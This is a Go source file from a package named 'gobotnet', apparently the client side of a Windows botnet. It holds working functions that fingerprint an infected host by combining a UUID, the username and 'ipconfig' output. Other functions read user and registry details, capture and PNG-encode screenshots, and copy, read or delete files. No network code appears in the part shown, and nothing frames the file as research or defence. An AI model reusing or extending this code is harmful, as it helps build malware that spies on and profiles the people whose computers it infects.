package gobotnet

import (
	//"encoding/base64"
	"bytes"
	"errors"
	"fmt"
	"github.com/satori/go.uuid"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	"image"
	"image/png"
	"io"
	"io/ioutil"
	"os"
	"os/user"
)

var (
	id uuid.UUID = uuid.NewV4()
)

func CmdTest() {
	fmt.Println("test prgCmd")
	// fmt.Println(getName())
	//fmt.Println(getOS())
	// fmt.Println(getUid())
	// fmt.Println(getUsername())
	// fmt.Println(getHomeDir())
	//fmt.Println(base64.StdEncoding.EncodeToString([]byte(getIdentificator())))
	image := GetScreenshot()
	bytes, _ := ImageToBytes(image)
	fmt.Println(bytes)
	//SaveImageToFile(image, "1.png")
}

func getIdentificator() string {
	ipConfigOut, _ := CmdExec("ipconfig")
	return id.String() + GetUsername() + string(ipConfigOut)
}

func GetUid() string {
	usr, _ := user.Current()
	return usr.Uid
}

func GetHomeDir() string {
	usr, _ := user.Current()
	return usr.HomeDir
}

func GetName() string {
	usr, _ := user.Current()
	return usr.Name
}

func GetUsername() string {
	usr, _ := user.Current()
	return usr.Username
}

func GetOS() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
	if err != nil {
		return ""
	}
	value, _, err := key.GetStringValue("ProductName")
	if err != nil {
		return ""
	}
	return value
}

func GetScreenshot() *image.RGBA {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		OutMessage(err.Error())
	}
	return img
}

// func CheckFileExists(nameFile string) error {
// 	fileInfo, err := os.Stat(nameFile)
// 	if err != nil {
// 		if os.IsNotExist(err) {
// 			errors.New("File not exist.")
// 		}
// 		return err
// 	}
// 	return nil
// }

func ReadFile(nameFile string) (bytesFile []byte, err error) {
	return ioutil.ReadFile(nameFile)
}

func SaveImageToFile(image *image.RGBA, nameFile string) error {
	f, err := os.Create("./" + nameFile)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	err = png.Encode(f, image)
	if err != nil {
		OutMessage(err.Error())
		return err
	}
	f.Close()
	return nil
}

func ImageToBytes(image *image.RGBA) ([]byte, error) {
	buf := new(bytes.Buffer)
	err := png.Encode(buf, image)
	imageBytes := buf.Bytes()
	return imageBytes, err
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return errors.New("Bad copy file")
	}
	return nil
}

func DeleteFile(nameFile string) error {
	err := os.Remove(nameFile)
	if err != nil {
		OutMessage(err.Error())
	}
	return err
}
